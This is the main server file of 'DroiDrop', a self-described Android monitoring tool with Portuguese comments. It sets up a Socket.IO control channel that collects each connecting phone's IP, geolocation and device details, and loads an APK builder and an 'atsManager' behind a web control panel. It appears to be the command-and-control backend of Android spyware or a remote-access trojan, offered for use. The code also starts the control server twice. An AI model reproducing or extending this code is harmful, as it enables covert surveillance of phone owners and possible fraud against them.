/*
 * DroiDrop
 * An Android Monitoring Tool
 * By VoidTyphoon.co.uk
 */

const express = require("express"),
  app = express(),
  IO = require("socket.io"),
  geoip = require("geoip-lite"),
  fs = require("fs"),
  https = require("https"),
  cookieParser = require("cookie-parser"),
  helmet = require("helmet"),
  rateLimit = require("express-rate-limit"),
  CONST = require("./includes/const"),
  db = require("./includes/databaseGateway"),
  logManager = require("./includes/logManager"),
  clientManager = new (require("./includes/clientManager"))(db),
  atsManager = new (require("./includes/atsManager"))(db),
  apkBuilder = require("./includes/apkBuilder");

// ==================== HTTPS CONFIGURATION ====================
const options = {
  key: fs.readFileSync("./localhost+2-key.pem"),
  cert: fs.readFileSync("./localhost+2.pem"),
};

const httpsServer = https.createServer(options);

// ==================== SOCKET.IO SOBRE HTTPS ====================
let client_io = IO(httpsServer, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
  },
});

client_io.sockets.pingInterval = 30000;

client_io.on("connection", (socket) => {
  socket.emit("welcome");

  let clientParams = socket.handshake.query;
  let clientAddress = socket.request.connection;
  let clientIP = clientAddress.remoteAddress.substring(
    clientAddress.remoteAddress.lastIndexOf(":") + 1,
  );
  let clientGeo = geoip.lookup(clientIP);
  if (!clientGeo) clientGeo = {};

  clientManager.clientConnect(socket, clientParams.id, {
    clientIP,
    clientGeo,
    device: {
      model: clientParams.model,
      manufacture: clientParams.manf,
      version: clientParams.release,
    },
  });

  if (CONST.debug) {
    var onevent = socket.onevent;
    socket.onevent = function (packet) {
      var args = packet.data || [];
      onevent.call(this, packet);
      packet.data = ["*"].concat(args);
      onevent.call(this, packet);
    };
    socket.on("*", function (event, data) {
      console.log(event);
      console.log(data);
    });
  }
});

// Inicia servidor HTTPS
httpsServer.listen(CONST.control_port, () => {
  console.log(`[HTTPS] Socket.IO rodando na porta ${CONST.control_port}`);
});

// ==================== CONFIGURAÇÃO DO EXPRESS ====================
app.disable("x-powered-by");
app.set("trust proxy", 1);
app.set("view engine", "ejs");
app.set("views", __dirname + "/assets/views");
app.use(express.static(__dirname + "/assets/webpublic"));
app.use(cookieParser());

// ==================== HELMET + SECURITY HEADERS ====================
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:"],
        connectSrc: ["'self'", "wss:", "ws:"],
        fontSrc: ["'self'"],
        objectSrc: ["'none'"],
        frameAncestors: ["'none'"],
      },
    },
    crossOriginEmbedderPolicy: false,
    crossOriginResourcePolicy: { policy: "cross-origin" },
  }),
);

// ==================== RATE LIMITING ====================
const generalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutos
  max: 200, // limite por IP
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: "Muitas requisições. Tente novamente mais tarde." },
});

// Rate limit mais restritivo para login (já tem proteção extra em expressRoutes)
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: "Muitas tentativas de login. Aguarde 15 minutos." },
});

app.use(generalLimiter);

// Aplicar limitador de auth nas rotas de login
app.use("/login", authLimiter);
app.use("/api/login", authLimiter);

// **IMPORTANTE**: Define o app global ANTES de carregar as rotas
global.app = app;
global.CONST = CONST;
global.db = db;
global.logManager = logManager;
global.clientManager = clientManager;
global.atsManager = atsManager;
global.apkBuilder = apkBuilder;

// Carrega as rotas depois de definir o global.app
app.use(require("./includes/expressRoutes"));

// ==================== SERVIDOR WEB ====================
// Modo recomendado em produção: rode atrás de NGINX (proxy reverso)
// Rode com: BEHIND_PROXY=true node index.js

const isBehindProxy = process.env.BEHIND_PROXY === 'true' || process.env.LISTEN_HOST === '127.0.0.1';

const webHost = process.env.WEB_HOST || (isBehindProxy ? '127.0.0.1' : '0.0.0.0');
const controlHost = process.env.CONTROL_HOST || (isBehindProxy ? '127.0.0.1' : '0.0.0.0');

if (isBehindProxy) {
  // MODO PROXY: escuta apenas em localhost. NGINX faz a terminação TLS e redirecionamento.
  // Web UI roda em HTTP simples (NGINX adiciona HTTPS)
  app.listen(CONST.web_port, webHost, () => {
    console.log(`[PROXY] Web UI rodando em http://${webHost}:${CONST.web_port} (atrás do NGINX)`);
  });

  // Control (Android) pode continuar com TLS próprio ou também ser proxyado.
  // Recomendado: manter com TLS direto ou usar subdomínio no NGINX.
  httpsServer.listen(CONST.control_port, controlHost, () => {
    console.log(`[PROXY] Control/Socket.IO rodando em https://${controlHost}:${CONST.control_port}`);
  });
} else {
  // MODO DIRETO (desenvolvimento ou exposição direta)
  const webHttpsServer = https.createServer(options, app);

  httpsServer.listen(CONST.control_port, controlHost, () => {
    console.log(`[HTTPS] Socket.IO rodando na porta ${CONST.control_port}`);
  });

  webHttpsServer.listen(CONST.web_port, webHost, () => {
    console.log(`[HTTPS] Interface rodando na porta ${CONST.web_port}`);
  });
}
